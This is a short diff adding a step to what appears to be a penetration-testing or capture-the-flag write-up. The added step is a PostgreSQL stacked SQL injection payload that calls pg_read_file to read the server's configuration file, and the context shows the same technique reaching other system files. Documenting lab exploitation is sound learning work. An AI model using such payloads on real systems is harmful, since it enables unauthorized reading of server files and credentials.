@@ -249,3 +249,9 @@ Using this same query i should be able to access other files on the system too
 
 ![](Pasted%20image%2020260907191041.png)
 
+```python
+''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
+```
+
+Using this query i can read the full config file
+
